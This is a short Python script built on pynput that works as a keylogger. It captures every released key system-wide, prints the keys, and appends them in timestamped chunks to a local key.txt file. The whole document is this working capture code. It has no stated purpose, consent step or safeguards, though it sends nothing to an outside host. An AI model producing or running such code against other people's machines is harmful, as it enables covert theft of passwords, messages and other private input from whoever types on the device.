# -*- coding:utf-8 -*-
from pynput.keyboard import Key, Controller, Listener
import time
from datetime import datetime
import os

keyboard = Controller()
keys = []
file_path=os.path.join(os.getcwd(),'key.txt')

def on_press(key):
    string = str(key).replace("'", "")


def on_release(key):
    global keys
    string = str(key).replace("'", "")
    keys.append(string)
    main_string = "".join(keys)
    print(main_string)
    if len(main_string) > 15:
        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open(file_path, 'a') as f:
            f.write(f'{current_time} - {main_string}\n')
            keys = []


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
